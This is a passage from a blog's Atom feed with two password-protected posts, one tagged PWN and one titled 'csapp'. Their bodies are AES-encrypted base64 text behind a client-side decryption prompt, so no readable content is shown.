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 </div>]]></content>
    
    
    <summary type="html">The article has been encrypted, please enter your password to view.&lt;br&gt;</summary>
    
    
    
    
    <category term="PWN" scheme="https://pz1o.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>csapp</title>
    <link href="https://pz1o.top/2021/04/18/csapp/"/>
    <id>https://pz1o.top/2021/04/18/csapp/</id>
    <published>2021-04-18T15:00:26.000Z</published>
    <updated>2021-04-26T14:24:46.004Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Please enter the password to read the blog.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> U2FsdGVkX19duq3DmUEzKwl0Wbt9id1m2P1yCyfLyyLjeexNVLBQvnewTDN2zfKfPLxi8OGz9E6sPC59rKLhjRsTDdYZSNa2IS3rLVgIdGiYTXhrsMsjf+AU4OSdzz1YxghqYnlQBuLxRgNBPKOHNpk0beS0kpXvWtAaMotf5t+8m0cd9y4dfI298MZTUVu5EUOOXjA7dGR2SyvcEvN3DpDoL7MBZnaKKnQVaZApNBoF87OxZZHmYg5Hy2lmkm7wxgQrqYkNo9w8MNlvT2qGcEoD1d6TSzIpS9nRakPXCgtCPg6UYn++rH8VO7T6Jt1lWMekcNsLZwcV/ooRIF8i6pB8E/6zkVuS1ooaJ6hGYm5Jm5hexMv16glC5u1eyWAC4ZHYvYUU6TnYLdj16MWcY9GUclCJyg7zlAfbfawEgNxWrhdQifQ8vU2+qgRg1csPW7JWcLJ6IEhtqBZOBxaAh0zkt3DWxXDVdEDFBndi6soBrIW7tgw0PRWhJDGhZJ9jzeHsGEOzOWTU3MoI1MdBOxTNScqbXo6G68iSJNSy1g0raFkS039r6001e8Lq53k8oog9Z1XQPM3HLJetcaXWVmAGHPPqRFokIA9IxnVEe5JwWSOuCxirp4WeW74FDqjPPHHt5XBb6bHlNZcZIdjEWrLkXF96Ae174uXK8mZsFMI1nT/SnUv3EvjjUUBTxMrGq6+FQZJM9V421YV/MAcEbq0nP9+86xvj60b6xuJy8980zYC4L0uHE1NIEoFKBUXTQsugr2ZMhIWsLVJ+sf1EEyZm1FSdxnpwgWgU5EKJAHBSrtX/ivZDeXYTyP0PpF0mIjzSRo8odr6/X33oWmmlzCwX+wbPvpfah4WCCpgRok0M0aDIJ9mVVpRsW8Mg5aITOugdxu8tJBsO+diKVpf4jYFrLr11znT2nKejeYzMaBMh/SKOua66mtnu50N9hpGW2idscpqXRt9OKkZTCnc8ZukK66xjRANPvnCQXplnQHewHra1qKYKIxmC0OOvpwjHWpfrbCVa5ShLcvSJYAWDpLKyS35Et0RUgGpOnZnV0Yuv1Kr/M+E3R5tWu3YjqiGl3tNH+SpTdZcg39jpC5Sxj+LGsxWxpjhR8/XJC0ZIw0lpceu+kaHJ8MUdU8GAMbs8yR4PPN6nDT7ekohXkNTT0/txO+M/a3Usq29veBdcpZhlqQo4HYYHFuK0mGjgY+NzA7nXfG2YOTIN89/FvQE/Age6OMRmgXL1Nh76uz8/CeOG0+U5Zg1zGFrsP9omqH4tlnnar/Xugi270DzCOsKSPzk9gpNdwTcnqVDRWEtkFflszYyHPrrpRVXMBStndllsnni86t+icwtoDVTjh0s+47+sxNvy139qf4AV+HeTgzKiqEYXua8Kd1o1DpjE3yK33Ijn+BayZfActgf1Qkx/gNrjksJgZRPy+XevLnfRVyDNqrp6APjoZQC495xCrqo+UpbT0j/ZiCuZcrnhIVGemhyX5bg4f2ovnvjm+g1DcNQfwjUkJvrkLp7Y3QVlimi1NopBkesGRdpQYivIbVVipP6Se/qpOKMQj5Xvf6W5yUAPSUP1yLMXkoINgYbzrbSLMT34Tf0ep1Dzd0ZEYzLmUg7jYQzE1O0PJ8djn7Etr6Cvtl4/HMEJ7CfzL2mGgehmRYDtyO3BmJdcjZiGX6yBrAjVT5c90MIyIYBmQu7jD3lOp8gb8zhnA0xEqSmEWwzLmi20Ka7qb82nUezVBKltvutUGx3smg3Ot5sHAwuU2vp8m6+QubL8eWqUHBQVVAW11julNJ0t3XZihuwiPVJeKIYen/fSEujj1JG9JU0sH+YBmINeFrIbyTVQFJQkU5QlqzBDXEpK4qJG+dEigFova+pPHZWlM1IDAqcMyAIkzHYQMXHVQWHSMJ3F1cXgLKMBHpUN6IkfATS4lwBC85JJYlG52YdjzyjPCqieuiuKVrlE71a0kM3RRgQaoWAwAylr5fWLx83crAtONb6wIFcYHOhxqEG/gjVY6fwVs9S33+u+PyidKPvPtVa+MTtQN2GSejB8X5myakwNp/uKfLS6eU1YSH5x7mgLSpnIFWl44q7KuD7/Vp6Y3Vd2/wVkLtf9SrouO63KkAfYVsAEX5Qw5PH+3QvPAQDqkamtk2pSzorx6DSIsOwUVMH2GsUIqFXn+8rApOOqxmI4HMeSD3rk4kRYQh48rxOrbbqzuLVHttOOPk3XxKC9bFM7bZ0oUwKFlzFgmZ8O9Nb+A5/B9No3yKuk91Ks1sXnrerSzXgwJaKyosKF6KaDa+GnJxUo0z3y1kTnBOROJa31lzJD3GIWa9ujdQ6gKi//Qgz4fTDmtPOEVbfbingZ+cP+/SWnUl2JbcqY6aeEP9zPTuGv8CvrWQ5C7wIIoE2nAng6jeJdzjyeB6iLMh4elOa+mjDwTzembQPeuki62TJLh8p17XH217sUPoI7XFM7HfwXQulAhBdQZR5ImgWKqObYyrLS0icL+82qhVL5wgqnCZScLwhAv+lfqJJuL1fpUCJcVHOQ0jUptnLrQE2VG+HogXW2OfZ4anTPl+MIwOpQbeb7+GGq31PYoa+6P3ZLO45wBt9kdgJwb4yht1to22hilb8Xvq6Htggf4CtfnWb2O90fLiSgaxdZ+ksQBw8KkP2p9tmGAYLQbSWxkF/sGi2dZRAlZFD/j0zn/77dBi+aF8x0OXhy+ZkZyyEvLu5JHAH2U+gBWN1ETcHDjVXcggY4TMsjYg1VzsmLYvY5D1FjGDpF7V3b7qqB5b96B9cwhA67MzYi3inu3H/5TKgvwgrrNDD0cZ1rvtD2dVfcYmWrdLSHtuoV75Ga+AfeblsqvG6YpvrCeGuMJUG/m6JCfGFmn8LzhXuDUwGuuYCM44AHsxPnqB8C6ZpwAfmKbDotB+MeByfWOljDMW1cA0gDyT2ebsPs/TeAC/cK+KN2sREeKI6iA5D1dVV8HaoDxVkZn6Zqm0mpDk6JthfUjtWY0Dnap6z4B7gRXsddbSGyar8sbwdEdOWGu4NwjRZ8Eiw3VGv0YINGQVpr6CA8OhBueSlsSe/0VYoePZRvaoPN4PWytYounUW/BCaO123rGniGrsCF5nott8g15QV9xgzN1mECwgYBc6iED4VnesUFvx2AWD7/+9La6sMNWEHImxXKMU68Nj+sI8NAVahGVp0xlzmDWeNakDj/pQAD+6qSAZguPKaZO/5lS7VS44J+tj5jwQwEG51kXZP+CnqgxxaZVlo26p7Gsdt1z84N5dXjIbdkCy/1UAzDnVw8J1EFj2aEVGQYL+enHrTOndnzRHgLYR2qKSUUEmtec8aDDsgocyQtTTwh7Ib122gfSsW0F1dxJVjFI29fAZMGxm+XMOFfE2UfkMDbV9r7yVFrdAjx90jI8I5AFAQgVPMA1GB99myyPYcdZrGvaIm4s2sqznAd/POw3odT//0VbYGYTBQ5+NwM1vFgKxheXgbxOfprEQ1VZApPwW5EOphOHd2EBbkHCUguS/hveyloxnXCbzdJpCAtrWBwct83Cxa+8lv41t+tJAD42K9RzjMmgCuqktbqVGNf/3go2wrW6rHNUO0VSDTJl5RyqOQ4y3/wJPnmsKKE8wKtCJWvI2ao/YxHxQWtLsBnZJpD5X/HqN5AeAmni5wDv1wH4T/TZgASptvZcwp2l9LT7A2UbH0vstOlZBAVDgLYbZeMmInmWaAofnyObOmgKG9UFIFWDXiD69qoJxdincumX7xGtJpAjsDNHFclSgbd8gqwBvkXso5FEcfPTlam8Wve+QIOjStwfBjV7rrVLCt4DAwASspUXoBHDJQe1wnvAAxLwE2wj6kRfdSQmWE3v3ntezduvAVpCjsr+pgKsiHrnhhkF8NdnLPKyY/VP2UGlcqV5JL9HNXXjxdsmhhp/wCas25iI7ptWJ9YmLPAh6BOcoQgtvEqDFGDnAYwjZCBvrU0y0UMTdyLoP2pcuuAMh0wbFB6v8BqD0XGEhoyKAgKQU2DPB/z77bXvm3q8JvCTuqhPFHw6a/UZoSbWVkCh6loQ+OgOq80EHswp7yIWW8dPCGJzo3hJmXv3LwP/LishTv1lcp/bw6d/TnBQv1FERQ9Z3a/s3pCV0X6UcPuxSKIkaiLXeUYKSbJ7wreDwX/Hysri9/sIzTsSEqz+Banr2xJddu5oV6K8HS9o+NIhlVJuxeS+FZ76irbTdmXuBI1qBeyoGqc9YC+LWSjUsXHKz9NoRcHdbeiCaEg+3Ic37i3TFr43WjBS2V2dCPH9JxJphsUtxKE+pbAP9inda+xVTzckJ1JeL41cguOr38QzS+yrC7vkqoUYhhcPdcpPwmbOss69BzpqyhCSnHZCntS6vSIdabkMMBqvH1dc1pms+1B2cHHcO0vuH7wOQSAwZAgj/bCVbXIKdC+DKZolpt7fNCal